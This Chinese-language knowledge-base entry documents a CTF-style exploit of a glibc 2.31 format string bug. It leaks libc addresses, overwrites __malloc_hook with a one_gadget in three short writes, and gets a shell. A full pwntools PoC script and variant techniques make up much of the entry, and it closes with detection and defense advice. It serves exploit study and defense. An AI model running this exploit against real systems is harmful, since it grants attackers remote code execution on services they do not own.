---
id: binary-pwn-format-string-malloc-hook-one-gadget
title: 格式化字符串分三次 short 写 __malloc_hook 为 one_gadget（glibc 2.31）
type: scenario
domain: binary
path: binary/pwn/format-string
technique: format-string-malloc-hook-one-gadget
tags:
- pwn
- format-string
- malloc-hook
- one-gadget
- glibc-2.31
- arbitrary-write
- ctf
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V155
  verified_at: '2026-11-06T07:48:25+08:00'
  notes: 已对照原文与图片01/02核对：change() printf(buf) fmt洞、add() malloc(0x100)、leak %21$p/%26$p、偏移0x24083/0x14A0、fmtstr_payload short三次写__malloc_hook、one_gadget 0xe3b01均与原文脚本一致。未验证点：原文未附getshell回显，未复跑exp。
url: /docs/binary/pwn/format-string/binary-pwn-format-string-malloc-hook-one-gadget/
draft: false
kb_aliases:
- __malloc_hook 劫持
- malloc_hook one_gadget
- fmtstr_payload 写 hook
- glibc 2.31 malloc hook
- 格式化字符串 hook 覆盖
---

## 一句话结论

在仍保留 `__malloc_hook` 的 glibc（如 2.31）上，格式化字符串漏洞可先用 `%p` 泄露 libc 基址，再用 `fmtstr_payload` 按 2 字节粒度分三次把 `__malloc_hook` 覆写为 one_gadget；之后任意触发 `malloc`（如菜单的 add 功能）即跳转 one_gadget 获得 shell。

## 原理

- `printf(buf)` 把用户输入当格式串，`%<k>$p` 可读取栈上第 k 个参数。泄漏数据中的 libc 返回地址减去已知偏移（如 `0x24083`）得到 libc 基址；PIE 返回地址减去偏移（如 `0x14A0`）得到程序基址。
- `%n` 把已输出字符数写到指定指针；`fmtstr_payload(offset, {addr: value}, write_size='short')` 会自动布置地址与格式串，实现任意地址写。
- glibc 2.31 的 `__malloc_hook` 是 libc 数据段中的全局函数指针，`malloc` 入口检查其非空时直接调用；把 hook 覆盖为 one_gadget 地址，下一次 `malloc` 即执行 one_gadget（满足其 `execve("/bin/sh", ...)` 约束时拿 shell）。
- 分三次写 `hook`、`hook+2`、`hook+4` 的低 16 位，避免一次写 6 字节导致的超长格式串与不稳定；`write_size='short'` 让每次 `%hn` 只写 2 字节。
- 之所以成立：hook 位于可写 libc 数据段，格式化字符串的任意写不受二进制 RELRO 保护限制；问题只在于能否稳定泄露 libc 并完成多次写。

## 触发条件

- 存在 `printf(user_input)` 类格式化字符串漏洞，且能确定参数在栈上的位置索引。
- 目标 libc 仍导出 `__malloc_hook`（glibc ≤ 2.33；2.34 起移除）。
- 能泄露 libc 基址（或已知 libc 版本与地址）。
- 程序在利用后有 `malloc` 调用点（菜单分配、解析输入等）。

## 利用步骤

1. 发送 `%21$p-%26$p` 等格式串，从回显中分离 libc 返回地址与程序返回地址。
2. 用已知偏移计算 `libc_base` 与 `base`，确认 `libc.sym['__malloc_hook']` 与 one_gadget 偏移（如 `0xe3b01`）。
3. 调用 `fmtstr_payload(6, {malloc_hook: value & 0xffff}, write_size='short')` 分三次写 `malloc_hook`、`malloc_hook+2`、`malloc_hook+4`。
4. 触发一次 `malloc`（如菜单选项 add）执行 one_gadget。
5. 若 one_gadget 约束不满足，改覆盖 `__free_hook` 为 `system` 并释放内容为 `/bin/sh` 的块，或走 ROP。

## PoC

```python
from pwn import *

context(os='linux', arch='amd64', log_level='debug')
p = remote('target', 22356)
libc = ELF('./libc.so.6')

p.recvuntil(">> ")
p.sendline(b'2')
p.sendline(b'%21$p-%26$p')
p.recvuntil("the name is:\n")
leak = p.recvline().strip().split(b'-')

libc.address = int(leak[0], 16) - 0x24083
base = int(leak[1], 16) - 0x14A0
malloc_hook = libc.sym['__malloc_hook']
one_gadget = libc.address + 0xe3b01

def fmt_write(addr, value):
    p.recvuntil(">> ")
    p.sendline(b'2')
    p.sendlineafter("Please write your name:\n",
                    fmtstr_payload(6, {addr: value}, write_size='short'))

fmt_write(malloc_hook, one_gadget & 0xffff)
fmt_write(malloc_hook + 2, (one_gadget >> 16) & 0xffff)
fmt_write(malloc_hook + 4, (one_gadget >> 32) & 0xffff)

p.recvuntil(">> ")
p.sendline(b'1')   # 触发 malloc
p.interactive()
```

## 变体与关联

- 变体：覆写 `__free_hook` 为 `system`，再 `free("/bin/sh")`；或覆写 `__malloc_hook` 为 `system` 并让参数指向可控字符串。
- 变体：写 `exit` 的 `__exit_funcs`/`_dl_fini` 等 libc 钩子；或走 `setcontext` 做栈迁移。
- 变体：若一次 `%n` 写 8 字节不稳定，按 1/2/4 字节粒度拆分；地址含 `\x00` 时把地址放格式串末尾。
- 关联：格式化字符串 GOT 劫持、`__free_hook + setcontext` 堆利用、one_gadget 约束选择。

## 检测与防御

- 修复根因：所有 `printf`/`fprintf`/`syslog` 使用固定格式串，如 `printf("%s", buf)`；编译加 `-Wformat-security`、`_FORTIFY_SOURCE=2`。
- 利用面削减：升级 glibc ≥ 2.34（移除 malloc/free hooks），或使用 hardened allocator；这不能替代修复格式化字符串漏洞。
- 运行时：启用 Full RELRO、PIE、Canary 只能提高其他环节门槛，不影响 libc hook 写入，需结合 ASLR 与指针保护。
- 检测：监控崩溃/异常中的 `%p`、`%n` 序列与超长格式串；在测试环境对 `printf(user_input)` 做静态审计（CWE-134）。
